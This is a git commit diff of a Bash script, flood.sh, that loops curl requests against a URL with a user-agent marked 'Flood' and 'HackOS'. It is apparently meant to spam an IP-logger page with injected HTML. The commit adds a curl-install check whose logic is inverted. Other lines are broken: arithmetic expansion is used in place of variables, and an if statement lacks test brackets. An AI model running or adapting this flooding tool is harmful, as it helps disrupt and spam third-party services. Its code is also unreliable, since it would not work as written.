6b1b99bc0f10f986a77ac334c1beb9a38f93fddd
SossenSystems <33610430+SossenSystems@users.noreply.github.com>
2018-02-25 23:31:04 +0100

    Update flood.sh

--- flood.sh
+++ flood.sh
@@ -5,12 +5,22 @@ user-agent="IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i
 RED='\033[0;31m'
 GREEN='\e[32m'
 NC='\033[0m'
-if [[ $1 == 'start' ]]; then 
-	printf "${RED}Start flooding...${NC}\n"
-	for ((i=0; i < count; i++)) ; do
-		curl --silent --output /dev/null -A $((user-agent)) $((url)) > /dev/null
-	done
-	printf "${GREEN}Flooding has been finished!${NC}\n"
+if [[ $1 == 'start' ]]; then
+	if apt -qq list curl 2>/dev/null | grep -q installed ; then
+		echo -e "Command not found! Install? (y/n) \c"
+		read
+		if "$REPLY" = "y"; then
+			sudo apt-get install curl
+		else
+			printf "${RED}cURL installer aborted!${NC}\n"
+	   fi
+	else
+		printf "${RED}Start flooding...${NC}\n"
+		for ((i=0; i < count; i++)) ; do
+			curl --silent --output /dev/null -A $((user-agent)) $((url)) > /dev/null
+		done
+		printf "${GREEN}Flooding has been finished!${NC}\n"
+	fi
 else
 	printf "${RED}Start it with 'start'!${NC}\n"
 fi
